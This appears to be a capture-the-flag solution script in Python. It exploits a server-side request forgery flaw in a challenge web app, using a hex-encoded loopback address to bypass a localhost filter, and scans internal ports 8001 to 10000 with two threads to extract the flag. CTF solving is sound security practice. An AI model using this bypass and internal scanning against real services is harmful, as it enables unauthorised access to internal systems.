import requests
from sys import exit
from pwn import *
from threading import Thread

url = "http://web.zh3r0.cf:6969/request"

def a(s, e):
    global localhost
    for i in range(s,e):
        data = {"url":"http://0x7f000001:{}".format(i)}
        res = requests.post(url, data=data).text
        if "Learn about URL" not in res and "Please dont try to heck me sir..." not in res:
            flag = res.split('&#39;')
            for s in flag:
                if 'zh3r0{' in s:
                    log.info("The internal Server is {}".format(data['url']))
                    log.info("The flag is {}".format(s))
                    break

if __name__ == "__main__":
    log.info("Exploit")
    th1 = Thread(target=a, args=(8001, 9000))
    th2 = Thread(target=a, args=(9001, 10000))

    th1.start()
    th2.start()

